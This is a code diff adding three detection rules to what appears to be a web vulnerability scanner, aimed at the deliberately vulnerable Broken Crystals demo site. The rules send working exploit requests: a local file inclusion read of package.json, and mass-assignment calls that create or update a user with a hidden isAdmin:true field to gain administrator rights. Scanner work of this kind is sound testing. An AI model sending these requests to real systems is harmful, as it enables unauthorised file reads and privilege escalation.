@@ -32610,6 +32610,174 @@ const brokencrystalsFileRawLfiLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function brokencrystalsPackageJsonLfiOk(body: string): boolean {
+  try {
+    const parsed = JSON.parse(body) as { name?: unknown; scripts?: unknown };
+    const scripts = parsed.scripts;
+    return (
+      parsed.name === "broken-crystals" &&
+      typeof scripts === "object" &&
+      scripts !== null &&
+      typeof (scripts as Record<string, unknown>).build === "string" &&
+      /nest build/i.test(String((scripts as Record<string, unknown>).build))
+    );
+  } catch {
+    return false;
+  }
+}
+
+const brokencrystalsFileLfiLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const packageUrl = new URL("/api/file", ctx.origin);
+  packageUrl.searchParams.set("path", "package.json");
+  const doc = await ctx.probe.get(packageUrl.toString(), { maxBytes: 8192 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!brokencrystalsPackageJsonLfiOk(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: packageUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Broken Crystals GET /api/file?path=package.json returns application package.json — local file inclusion oracle distinct from /api/file/raw"
+    }
+  };
+};
+
+async function brokencrystalsLoginToken(
+  ctx: RuleContext,
+  email: string,
+  password: string
+): Promise<string | null> {
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ user: email, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  return loginDoc.headers.authorization?.trim() || null;
+}
+
+async function brokencrystalsAdminPermissionIsTrue(
+  ctx: RuleContext,
+  email: string,
+  token: string
+): Promise<{ ok: boolean; url: string; snippet: string }> {
+  const permUrl = new URL(
+    `/api/users/one/${encodeURIComponent(email)}/adminpermission`,
+    ctx.origin
+  ).toString();
+  const permDoc = await ctx.probe.get(permUrl, {
+    headers: { authorization: token },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  const snippet = permDoc.body.slice(0, 120).trim();
+  const ok =
+    permDoc.status >= 200 &&
+    permDoc.status < 300 &&
+    /"isAdmin"\s*:\s*true/i.test(permDoc.body);
+  return { ok, url: permUrl, snippet };
+}
+
+const brokencrystalsMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const email = `thugir-ma-${Date.now()}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    isAdmin: true,
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const token = await brokencrystalsLoginToken(ctx, email, password);
+  if (!token) return NEGATIVE;
+  const perm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token);
+  if (!perm.ok) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: createUrl,
+      adminPermissionUrl: perm.url,
+      snippet: perm.snippet,
+      note: "Broken Crystals POST /api/users/basic accepts hidden isAdmin:true and GET /api/users/one/{email}/adminpermission returns isAdmin:true — mass-assignment privilege escalation oracle"
+    }
+  };
+};
+
+const brokencrystalsMassAssignmentPutLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const email = `thugir-put-${Date.now()}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const token = await brokencrystalsLoginToken(ctx, email, password);
+  if (!token) return NEGATIVE;
+  const beforePerm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token);
+  if (beforePerm.ok) return NEGATIVE;
+  const infoUrl = new URL(`/api/users/one/${encodeURIComponent(email)}/info`, ctx.origin).toString();
+  const putDoc = await ctx.probe.get(infoUrl, {
+    method: "PUT",
+    body: JSON.stringify({
+      isAdmin: true,
+      firstName: "Thugir",
+      lastName: "Probe",
+      company: "ProbeCo"
+    }),
+    headers: { "Content-Type": "application/json", authorization: token },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 300) return NEGATIVE;
+  const afterPerm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token);
+  if (!afterPerm.ok) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: infoUrl,
+      adminPermissionUrl: afterPerm.url,
+      snippet: afterPerm.snippet,
+      note: "Broken Crystals PUT /api/users/one/{email}/info accepts hidden isAdmin:true and escalates privileges — mass-assignment update oracle"
+    }
+  };
+};
+
 const brokencrystalsHiddenUploadLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const uploadUrl = new URL("/api/hidden-upload", ctx.origin).toString();
@@ -34492,6 +34660,9 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsTestimonialsSqliLiveOracle,
   brokencrystalsPartnerLoginXpathLiveOracle,
   brokencrystalsFileRawLfiLiveOracle,
+  brokencrystalsFileLfiLiveOracle,
+  brokencrystalsMassAssignmentLiveOracle,
+  brokencrystalsMassAssignmentPutLiveOracle,
   exposedApiConfig,
   sqliQueryParamInjection,
   sqliHeaderErrorDisclosure,
